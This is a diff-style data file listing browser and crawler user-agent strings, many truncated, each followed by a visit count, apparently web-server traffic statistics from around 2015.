+Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12B435 Safari/600
+0 86
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/41.0.2272.76 Chrome/41.0.2272.76 Safar
+0 92
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 S
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Saf
+0 154
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; Y220-U05 Build/HUAWEIY220-U05) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0
+0 1
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6
+0 3
+Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/4.0.1
+0 1
+Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1
+0 215
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
+0 1
+Mozilla/5.0 (iPad; U; CPU OS 5_0_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-us; GT-N8010 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.1; es-us; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Ver
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CL
+0 24
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-es; GT-I8260L Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 1
+Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257
+0 9
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; GT-P5210 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/
+0 87
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+0 198
+Mozilla/5.0 (Linux; Android 4.4.2; VS351 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mob
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 2646
+Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+0 10
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36
+0 1
+Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
+0 4
+Mozilla/5.0 (compatible; oBot/2.3.1; http://filterdb.iss.net/crawler/)
+0 5
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.5
+0 3
+Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon
+0 13
+Wget/1.13.4 (linux-gnu)
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; SM-G900H Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12D508 Saf
+0 6
+Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00.2/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (K
+0 96
+Mozilla/5.0 (X11; CrOS x86_64 14.4.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2354.0 Safari/537.36
+0 68
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.0 Safari/537.36
+0 19
+Hivemind
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safar
+0 1
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
+0 97
+Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+0 491
+Java/1.8.0_40
+0 1
+visionutils/0.2
+0 1
+Twitterbot/1.0
+0 14
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko)
+0 16
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-mx; LG-E612f Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 2
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; LG-E450f Build/JZO54K)
+0 2
+Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12D508 Safari/600.1
+0 89
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2358.0 Safari/537.36
+0 102
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; Avvio_750 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/3
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.1; es-mx; ALCATEL ONE TOUCH 5020A Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Ver
+0 1
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7
+0 1
+Jakarta Commons-HttpClient/3.1
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/5.2.43972 Mobile/11D257 
+0 100
+Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/5.0
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Safari/534.30
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; XT1032 Build/KXB21.14-L1.40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.
+0 3
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1
+0 2
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 1277
+Mozilla/5.0 (BlackBerry; U; BlackBerry 9320; es) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.398 Mobile Safari/534.
+0 2
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36
+0 2
+Mozilla/4.0 (Windows 98; US) Opera 10.00 [en]
+0 9
+Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MDDRJS; rv:11.0) like Gecko
+0 1
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.1000 Chrome/30.0.1599.101 Safari/537
+0 153
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8550L Build/JZO54K)
+0 2
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36
+0 1
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
+0 186
+Mozilla/5.0 (X11; CrOS x86_64 14.4.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2353.0 Safari/537.36
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+0 189
+Mozilla/5.0 (BlackBerry; U; BlackBerry 9220; es) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.398 Mobile Safari/534.
+0 87
+Mozilla/5.0 (Linux; Android 4.4.2; G0775 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mob
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
+0 1
+Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONE TOUCH 5036A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.22
+0 92
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D120 Build/KOT49I.V10a) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
+0 240
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 113
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2358.0 Safari/537.36
+0 63
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b
+0 58
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25
+0 6
+Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/3
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; D2306 Build/18.3.1.C.1.13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.
+0 1
+NetLyzer FastProbe
+0 40
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36
+0 55
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
+0 5
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
+0 219
+Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/17.0 Firefox/17.0
+0 3
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; SAMSUNG GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 C
+0 111
+Mozilla/5.0 (Linux; Android 4.1.2; GT-I8190L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile 
+0 88
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; NYX_NOBA_II Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobi
+0 1
+Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/5.2.43972 Mobile/11B554a Safari/9
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI P7-L10 Build/HuaweiP7-L10C02B129) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.
+0 1
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; GT-S6102B Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 M
+0 1
+Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.31438/36.1487; U; es) Presto/2.12.423 Version/12.16
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; SAMSUNG SGH-I337M Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 
+0 87
+Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+0 136
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko/20100101 Firefox/12.0
+0 9
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; ONE TOUCH 4015A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 
+0 1
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; RAINBOW Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 M
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; SM-G313M Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 
+0 5
+Safari/10600.5.16 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)
+0 2
+robots
+0 9
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
+0 1
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-sa; LG-E400g Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile 
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+0 99
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; GT-S5367 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mo
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; ALCATEL ONE TOUCH 7047D Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Vers
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-sa; LG-E431g Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729;
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; SOLONE SL-SM35 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 M
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+0 6
+Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/5.2.43972 Mobile/11D257 Safari/95
+0 1
+Mozilla/5.0 (Linux; U; Android 4.0.4; es-sa; LG-P768 Build/IMM76L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile 
+0 1
+Mozilla/5.0 (Linux; Android 4.3; SGH-I537 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Saf
+0 177
+Mozilla/5.0 (Linux; Android 4.1.2; Lenovo A706_ROW Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 M
+0 1
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5
+0 1
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 703
+Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 720)
+0 87
+Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2
+0 60
+Mozilla/5.0 (Linux; U; Android 4.3; es-us; HUAWEI Y530-U051 Build/HuaweiY530-U051) AppleWebKit/534.30 (KHTML, like Gecko) Ver
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; GT-S5360L Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 M
+0 103
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.0 Safari/537.36
+0 54
+Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.7 Safari/532.9
+0 3
+Mozilla/5.0 (Linux; Android 4.4.2; SM-G313M Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile S
+0 2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.3072
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:36.0) Gecko/20100101 Firefox/36.0
+0 1
+Mozilla/5.0 (Linux; Android 4.1.2; XT914 Build/2_32A_2012) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 215
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+0 190
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Safari/
+0 187
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+0 3
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 2340
+Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
+0 1
+Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.10 (maverick) Firefox/3.6.16
+0 1
+msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)
+0 79
+Mozilla/5.0 (Linux; Android 4.4.2; D2306 Build/18.3.C.0.40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; XT1063 Build/KXB21.85-24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobil
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
+0 2
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
+0 97
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
+0 94
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; GT-N5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/
+0 96
+Dalvik/1.6.0 (Linux; U; Android 4.1.1; M4TEL SS990 Build/JRO03C)
+0 2
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; Android 4.1.2; SGH-T599N Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+0 1
+Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+0 584
+Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
+0 1
+Java/1.7.0_25
+0 2
+Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+0 255
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+0 2
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S5310L Build/JZO54K)
+0 4
+Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
+0 2
+Mozilla/5.0 (Linux; Android 4.4.4; XT1045 Build/KXB21.14-L1.54) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.
+0 1
+Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630) like Gecko
+0 25
+Mozilla/5.0 (iPod; CPU iPhone OS 6_1_6 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B500 Safari
+0 80
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET C
+0 1
+Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +https://www.megaindex.ru/?tab=linkAnalyze)
+0 205
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; 0PCV1 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mob
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; Avvio_778 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; SAMSUNG SM-N900W8 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 
+0 102
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 102
+Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36
+0 6
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S6810M Build/JZO54K)
+0 4
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-us; GT-I8190L Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 4
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14
+0 2
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; MOT-XT303 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile 
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)                 Version/6.0 Mobi
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Safari
+0 14
+Mozilla/5.0 (Linux; Android 4.1.2; GT-S6810L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Mobile 
+0 2
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
+0 103
+Mozilla/5.0 (Linux; Android 4.4.4; XT1021 Build/KXC21.5-40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.
+0 3
+Baiduspider-image+(+http://www.baidu.com/search/spider.htm)
+0 5
+Mozilla/5.0 (Linux; rv:26.0) Gecko/20100101 Firefox/26.0
+0 1
+Mozilla/5.0 (Linux; U; Android 4.4.4; es-us; SM-G530H Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 107
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 1035
+Mozilla/5.0 (Windows NT 6.2; rv:36.0) Gecko/20100101 Firefox/36.0
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; HUAWEI Y330-U05 Build/HuaweiY330-U05) AppleWebKit/534.30 (KHTML, like Gecko) Ver
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-us; GT-S5310L Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 2
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
+0 89
+Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI Y550 Build/HuaweiY550-L03) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrom
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; U; Android 4.4.2; es-us; SM-G313U Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 1
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; A1-810 Build/JDQ39)
+0 2
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-sa; LG-E425g Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 88
+Mozilla/5.0 (Linux; Android 4.2.2; GT-I9060 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Sa
+0 94
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; GT-I8200L Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2)
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D320 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 M
+0 1
+Mozilla/5.0 (Linux; Android 4.0.3; IdeaTab A2107A-F Build/IML74K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-ar; C1904 Build/15.1.C.2.8) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+0 272
+Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG-SM-N900A Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 C
+0 1
+Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4
+0 487
+Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34
+0 95
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/7.1.4 Safari/537.85.13
+0 216
+Photon/1.0
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; GT-I9060 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile 
+0 1
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
